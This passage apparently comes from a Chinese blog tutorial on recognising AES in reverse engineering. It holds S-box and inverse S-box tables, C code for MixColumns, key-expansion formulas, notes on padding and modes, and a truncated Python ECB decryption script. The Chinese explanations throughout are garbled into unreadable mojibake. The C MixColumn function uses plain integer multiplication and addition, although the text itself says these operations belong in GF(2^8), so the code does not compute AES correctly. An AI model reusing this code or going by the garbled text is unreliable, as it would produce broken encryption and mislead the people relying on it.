class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>,<br><span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>,<br><span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br><span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,<br><span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>,<br><span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>,<br><span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>,<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>,<br><span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,<br><span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inv_S[<span class="hljs-number">256</span>] = &#123;<br><span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>,<br><span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>,<br><span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>,<br><span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>,<br><span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>,<br><span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>,<br><span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br><span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>,<br><span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>,<br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>,<br><span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>,<br><span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>,<br><span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>,<br><span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>,<br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br><span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>&#125;;<br></code></pre></td></tr></table></figure><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009427677-c6d93718-7ebe-4d87-80b5-a72a179a5c1c.png" class="" title="img"><p>ç‰¹å¾å€¼<strong>ï¼š&gt;&gt;4  &amp;0xF</strong></p><h3 id="è¡Œä½ç§»"><a href="#è¡Œä½ç§»" class="headerlink" title="è¡Œä½ç§»"></a>è¡Œä½ç§»</h3><p>åªåœ¨4Ã—4çŸ©é˜µçš„è¡Œé—´è¿›è¡Œæ“ä½œï¼Œæ¯è¡Œ4å­—èŠ‚çš„æ•°æ®ã€‚åœ¨åŠ å¯†æ—¶ï¼Œä¿æŒçŸ©é˜µçš„ç¬¬ä¸€è¡Œä¸å˜ï¼Œç¬¬äºŒè¡Œå‘å·¦ç§»ä¸€ä¸ªå­—èŠ‚ã€ç¬¬ä¸‰è¡Œå‘å·¦ç§»2ä¸ªå­—èŠ‚ã€ç¬¬å››è¡Œå‘å·¦ç§»3ä¸ªå­—èŠ‚</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009530480-a3c0925f-502d-46a2-8703-74027c4f7452.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009546418-117deded-2f60-4ed6-bdae-58ead405dd1a.png" class="" title="img"><p><strong>ç‰¹å¾å€¼ï¼šä¸‰ä¸ª&gt;&gt;å’Œ&lt;&lt;</strong></p><p>ä¹Ÿå¯ä»¥è¿™æ ·ï¼Œè¿™ä¸ªçœŸæœ‰ç‚¹æŠ½è±¡</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706086418277-4c776b78-c130-4fb2-8dcd-8136bea929be.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721699971674-0a74c06c-3b18-4598-99d6-184e37ea5562.png" class="" title="img"><h3 id="åˆ—æ··æ·†"><a href="#åˆ—æ··æ·†" class="headerlink" title="åˆ—æ··æ·†"></a>åˆ—æ··æ·†</h3><p>åœ¨åŠ å¯†çš„æ­£å‘åˆ—æ··æ·†ä¸­ï¼Œæˆ‘ä»¬è¦å°†è¾“å…¥çš„4Â·4çŸ©é˜µå·¦ä¹˜ä¸€ä¸ªç»™å®šçš„4Â·4çŸ©é˜µã€‚è€Œå®ƒä»¬ä¹‹é—´çš„åŠ æ³•ã€ä¹˜æ³•éƒ½åœ¨æ‰©å±•åŸŸGF(2^8)ä¸­è¿›è¡Œï¼Œæ‰€ä»¥ä¹Ÿå°±å¯ä»¥å°†è¿™ä¸€ä¸ªæ­¥éª¤åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†è¿›è¡Œè®²è§£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> MixArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] =<br>&#123;<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">MixColum</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>(*PlainArray)[<span class="hljs-number">4</span>])</span><br>&#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ArrayTemp[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br>    <span class="hljs-built_in">memcpy</span>(ArrayTemp, PlainArray, <span class="hljs-number">16</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>        &#123;<br>            PlainArray[i][j] =<br>            MixArray[i][<span class="hljs-number">0</span>] * ArrayTemp[<span class="hljs-number">0</span>][j] +<br>            MixArray[i][<span class="hljs-number">1</span>] * ArrayTemp[<span class="hljs-number">1</span>][j] +<br>            MixArray[i][<span class="hljs-number">2</span>] * ArrayTemp[<span class="hljs-number">2</span>][j] +<br>            MixArray[i][<span class="hljs-number">3</span>] * ArrayTemp[<span class="hljs-number">3</span>][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721700131232-474c042d-74f2-457d-912f-e311fecaab9c.png" class="" title="img"><h3 id="è½®å¯†é’¥åŠ "><a href="#è½®å¯†é’¥åŠ " class="headerlink" title="è½®å¯†é’¥åŠ "></a>è½®å¯†é’¥åŠ </h3><p>åœ¨å¯†é’¥åŠ æ³•å±‚ä¸­æœ‰ä¸¤ä¸ªè¾“å…¥çš„å‚æ•°ï¼Œåˆ†åˆ«æ˜¯æ˜æ–‡å’Œå­å¯†é’¥kï¼Œè€Œä¸”è¿™ä¸¤ä¸ªè¾“å…¥éƒ½æ˜¯128ä½çš„ã€‚åœ¨%2çš„æ‰©å±•åŸŸä¸­åŠ å‡æ³•ä¸å¼‚æˆ–è¿ç®—ç­‰ä»·ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€å¼‚æˆ–</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009117330-39bdc891-aba1-4e93-a5e1-9a3187705a95.png" class="" title="img"><h3 id="å¯†é’¥ç”Ÿæˆ"><a href="#å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å¯†é’¥ç”Ÿæˆ"></a>å¯†é’¥ç”Ÿæˆ</h3><p>å­å¯†é’¥çš„ç”Ÿæˆæ˜¯ä»¥åˆ—ä¸ºå•ä½è¿›è¡Œçš„ï¼Œä¸€åˆ—æ˜¯32Bitï¼Œå››åˆ—ç»„æˆå­å¯†é’¥å…±128Bitã€‚ç”Ÿæˆå­å¯†é’¥çš„æ•°é‡æ¯”AESç®—æ³•çš„è½®æ•°å¤šä¸€ä¸ªï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå¯†é’¥åŠ æ³•å±‚è¿›è¡Œå¯†é’¥æ¼‚ç™½æ—¶ä¹Ÿéœ€è¦å­å¯†é’¥ã€‚å¯†é’¥æ¼‚ç™½æ˜¯æŒ‡åœ¨AESçš„è¾“å…¥ç›’è¾“å‡ºä¸­éƒ½ä½¿ç”¨çš„å­å¯†é’¥çš„XORåŠ æ³•ã€‚å­å¯†é’¥åœ¨å›¾ä¸­éƒ½å­˜å‚¨åœ¨W[0]ã€W[1]â€¦W[43]çš„æ‰©å±•å¯†é’¥æ•°ç»„ä¹‹ä¸­</p><p>k1-k16è¡¨ç¤ºåŸå§‹å¯†é’¥å¯¹åº”çš„å­—èŠ‚ï¼Œè€Œå›¾ä¸­å­å¯†é’¥k0ä¸åŸå§‹å­å¯†é’¥ç›¸åŒã€‚åœ¨ç”Ÿæˆçš„æ‰©å±•å¯†é’¥ä¸­Wçš„ä¸‹æ ‡å¦‚æœæ˜¯4çš„å€æ•°æ—¶(ä»é›¶å¼€å§‹)éœ€è¦å¯¹å¼‚æˆ–çš„å‚æ•°è¿›è¡ŒGå‡½æ•°å¤„ç†</p><p>æ‰©å±•å¯†é’¥ç”Ÿæˆæœ‰å…³å…¬å¼å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>&lt;= i &lt;= <span class="hljs-number">10</span><br><span class="hljs-number">1</span>&lt;= j &lt;= <span class="hljs-number">3</span><br>W[<span class="hljs-number">4</span>i] = W[<span class="hljs-number">4</span>(i<span class="hljs-number">-1</span>)] ^ T(W[<span class="hljs-number">4</span>i<span class="hljs-number">-1</span>]);<br>W[<span class="hljs-number">4</span>i+j] = W[<span class="hljs-number">4</span>(i<span class="hljs-number">-1</span>)+j] ^ W[<span class="hljs-number">4</span>i<span class="hljs-number">-1</span>+j];<br></code></pre></td></tr></table></figure><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690012128070-bb35c99c-29d8-4e75-ae4b-07e7b4245b96.png" class="" title="img"><p>Tå‡½æ•°å®ç°è¾ƒå¤æ‚</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1711079059952-9a5a9730-8634-4b74-8dd1-b49bc974ceba.jpeg" class="" title="img"><h2 id="å¡«å……"><a href="#å¡«å……" class="headerlink" title="å¡«å……"></a>å¡«å……</h2><p>å‡ ç§å…¸å‹çš„å¡«å……æ–¹å¼ï¼š</p><p><strong>NoPadding</strong>ï¼š ä¸åšä»»ä½•å¡«å……ï¼Œä½†æ˜¯è¦æ±‚æ˜æ–‡å¿…é¡»æ˜¯16å­—èŠ‚çš„æ•´æ•°å€</p><p><strong>PKCS5Paddingï¼ˆé»˜è®¤ï¼‰</strong>ï¼š å¦‚æœæ˜æ–‡å—å°‘äº16ä¸ªå­—èŠ‚ï¼Œåœ¨æ˜æ–‡å—æœ«å°¾è¡¥è¶³ç›¸åº”æ•°é‡çš„å­—ç¬¦ï¼Œä¸”æ¯ä¸ªå­—èŠ‚çš„å€¼ç­‰äºç¼ºå°‘çš„å­—ç¬¦æ•°ã€‚ æ¯”å¦‚æ˜æ–‡ï¼š{1,2,3,4,5,a,b,c,d,e},ç¼ºå°‘6ä¸ªå­—èŠ‚ï¼Œåˆ™è¡¥å…¨ä¸º{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 }</p><p><strong>ISO10126Padding</strong>ï¼šå¦‚æœæ˜æ–‡å—å°‘äº16ä¸ªå­—èŠ‚ï¼ˆ128bitï¼‰ï¼Œåœ¨æ˜æ–‡å—æœ«å°¾è¡¥è¶³ç›¸åº”æ•°é‡çš„å­—èŠ‚ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦å€¼ç­‰äºç¼ºå°‘çš„å­—ç¬¦æ•°ï¼Œå…¶ä»–å­—ç¬¦å¡«å……éšæœºæ•°ã€‚æ¯”å¦‚æ˜æ–‡ï¼š{1,2,3,4,5,a,b,c,d,e},ç¼ºå°‘6ä¸ªå­—èŠ‚ï¼Œåˆ™å¯èƒ½è¡¥å…¨ä¸º{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}</p><p>PKCS7PaddingåŸç†ä¸PKCS5Paddingç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯PKCS5Paddingçš„blocksizeä¸º8å­—èŠ‚ï¼Œè€ŒPKCS7Paddingçš„blocksizeå¯ä»¥ä¸º1åˆ°255å­—èŠ‚</p><h2 id="æ¨¡å¼"><a href="#æ¨¡å¼" class="headerlink" title="æ¨¡å¼"></a>æ¨¡å¼</h2><p>AESçš„å·¥ä½œæ¨¡å¼ï¼Œä½“ç°åœ¨æŠŠæ˜æ–‡å—åŠ å¯†æˆå¯†æ–‡å—çš„å¤„ç†è¿‡ç¨‹ä¸­ã€‚AESåŠ å¯†ç®—æ³•æä¾›äº†äº”ç§ä¸åŒçš„å·¥ä½œæ¨¡å¼ï¼šCBC,ECB,CTR,CFB,OFB</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690264717940-bec2a882-45fa-45c4-a1c4-23670f7b6ba1.png" class="" title="img"><p>é€‚åˆåŠ å¯†éšæœºæ•°æ®</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690264745779-c3d4ad6b-2983-4bd2-aef1-588027847abd.png" class="" title="img"><p>é€‚åˆè½¯ä»¶åŠ å¯†:CFB,OFB,CTR</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><p>æ ‡å‡†aes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key = <span class="hljs-number">0x554B134A029DE539438BD18604BF114</span><br><br>key_bytes = key.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-built_in">print</span>(key_bytes)<br><br>encrypted_data = <span class="hljs-string">&quot;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&quot;</span><br><br>encrypted_bytes = base64.b64decode(encrypted_data)<br><br><br>cipher = AES.new(key_bytes, AES.MODE_ECB)<br><br><span class="hljs-keyword">try</span>:<br>    decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†ç»“æœ:&quot;</span>, decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">except</span> (ValueError, KeyError):<br>    <span 